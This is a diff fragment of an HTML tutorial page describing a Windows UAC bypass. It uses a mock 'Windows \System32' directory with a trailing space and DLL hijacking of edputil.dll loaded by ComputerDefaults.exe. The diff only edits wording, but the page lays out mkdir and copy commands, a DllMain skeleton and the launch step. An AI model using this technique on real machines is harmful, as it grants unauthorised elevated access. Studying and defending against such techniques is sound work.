@@ -1313,7 +1313,7 @@ mkdir &quot;C:\Windows \System32\&quot;
 <p>Step 2: Copy the target executable into the directory:</p>
 <pre><code class="language-cmd">copy C:\Windows\System32\ComputerDefaults.exe &quot;C:\Windows \System32\ComputerDefaults.exe&quot;
 </code></pre>
-<p>Step 3: For this method, the function required for edputil.dll is DllMain, modify and execute the following C code and name it as edputil.dll:</p>
+<p>Step 3: For this method, the function required for edputil.dll is DllMain, modify and compile the following C code and name it as edputil.dll:</p>
 <pre><code class="language-c">#include &lt;windows.h&gt;
 
 void domything()
@@ -1335,7 +1335,7 @@ BOOL WINAPI DllMain(HINSTANCE h, DWORD d, LPVOID l)
 	return TRUE;
 }
 </code></pre>
-<p>Then, move the DLL into the System32 directory. Your final directory structure should look like this:</p>
+<p>Then, move the DLL into the mock System32 directory. Your final directory structure should look like this:</p>
 <p><img src="./images/Pasted%20image%2020240702162950.png" alt="image" /></p>
 <p>Step 4: Execute the trusted binary:</p>
 <pre><code class="language-cmd">&quot;C:\Windows \System32\ComputerDefaults.exe&quot;
